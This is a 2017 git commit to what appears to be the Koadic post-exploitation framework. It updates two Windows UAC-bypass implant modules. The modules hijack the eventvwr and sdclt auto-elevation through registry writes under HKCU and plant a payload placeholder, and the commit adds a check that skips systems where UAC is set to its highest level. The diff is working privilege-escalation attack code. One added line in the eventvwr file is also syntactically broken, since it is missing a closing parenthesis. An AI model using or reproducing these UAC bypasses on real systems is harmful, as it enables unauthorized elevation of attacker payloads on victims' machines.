920db235fea7faf1b8f2a102f376e1e13315f553
vvalien <>
2017-08-16 19:30:24 -0400

    UAC highest setting fix

--- data/implant/elevate/bypassuac_eventvwr.js
+++ data/implant/elevate/bypassuac_eventvwr.js
@@ -1,5 +1,12 @@
 try
 {
+    var readpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+    var key = "ConsentPromptBehaviorAdmin";
+    var out = Koadic.registry.read(Koadic.registry.HKLM, readpath, key, Koadic.registry.DWORD);
+
+    if (out.uValue == 2)
+        throw new Error("UAC is set to highest";
+
     var path = "Software\\Classes\\mscfile\\shell\\open\\command";
 
     Koadic.registry.write(Koadic.registry.HKCU, path, "", "~PAYLOAD_DATA~", Koadic.registry.STRING);
--- data/implant/elevate/bypassuac_sdclt.js
+++ data/implant/elevate/bypassuac_sdclt.js
@@ -1,5 +1,12 @@
 try
 {
+    var readpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+    var key = "ConsentPromptBehaviorAdmin";
+    var out = Koadic.registry.read(Koadic.registry.HKLM, readpath, key, Koadic.registry.DWORD);
+
+    if (out.uValue == 2)
+        throw new Error("UAC is set to highest");
+
     var path = "Software\\Classes\\exefile\\shell\\runas\\command";
 
     var cmd = Koadic.file.getPath("%COMSPEC%");
